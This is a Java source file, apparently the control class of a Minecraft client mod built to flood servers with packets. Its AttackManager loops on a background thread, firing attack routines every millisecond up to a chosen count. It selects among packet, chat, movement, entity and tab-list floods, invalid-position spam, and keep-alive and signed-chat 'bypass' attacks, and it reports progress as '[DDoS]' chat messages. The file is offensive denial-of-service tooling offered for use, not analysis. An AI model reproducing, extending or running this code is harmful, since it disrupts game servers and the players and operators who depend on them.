package com.ddosclient.attack;

import com.ddosclient.attack.attacks.*;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class AttackManager {

    private volatile boolean running = false;
    private volatile AttackType currentType = null;
    private volatile int packetCount = 0;
    private final AtomicInteger sentCount = new AtomicInteger(0);
    private ExecutorService executor;
    private BaseAttack currentAttack;

    public void startAttack(AttackType type, int count) {
        stopAttack();
        running = true;
        currentType = type;
        packetCount = count;
        sentCount.set(0);
        executor = Executors.newSingleThreadExecutor();
        currentAttack = createAttack(type);
        if (currentAttack == null) return;

        final int totalCount = count;
        executor.submit(() -> {
            MinecraftClient mc = MinecraftClient.getInstance();
            while (running && sentCount.get() < totalCount) {
                try {
                    if (mc.getNetworkHandler() == null) break;
                    currentAttack.execute(mc);
                    int current = sentCount.incrementAndGet();
                    Thread.sleep(1);
                } catch (Exception e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            running = false;
            final int finalSent = sentCount.get();
            mc.execute(() -> {
                if (mc.player != null) {
                    mc.player.sendMessage(Text.literal(
                        "[DDoS] Attack complete: " + finalSent + "/" + totalCount + " packets sent"
                    ), false);
                }
            });
        });
    }

    public void stopAttack() {
        running = false;
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }

    public void tick(MinecraftClient mc) {
        int current = sentCount.get();
        if (running && mc.player != null && current % 500 == 0 && current > 0) {
            mc.player.sendMessage(Text.literal(
                "[DDoS] Status: " + current + "/" + packetCount + " | " + currentType.displayName
            ), true);
        }
    }

    public boolean isRunning() { return running; }
    public int getSentCount() { return sentCount.get(); }
    public int getPacketCount() { return packetCount; }
    public AttackType getCurrentType() { return currentType; }

    private BaseAttack createAttack(AttackType type) {
        return switch (type) {
            case PACKET_FLOOD -> new PacketFlood();
            case CHAT_FLOOD -> new ChatFlood();
            case MOVEMENT_FLOOD -> new MovementFlood();
            case ENTITY_PACKET_FLOOD -> new EntityPacketFlood();
            case KEEP_ALIVE_BYPASS -> new KeepAliveBypass();
            case INVALID_POSITION -> new InvalidPositionFlood();
            case SIGNED_CHAT_BYPASS -> new SignedChatBypass();
            case TAB_LIST_FLOOD -> new TabListFlood();
        };
    }
}
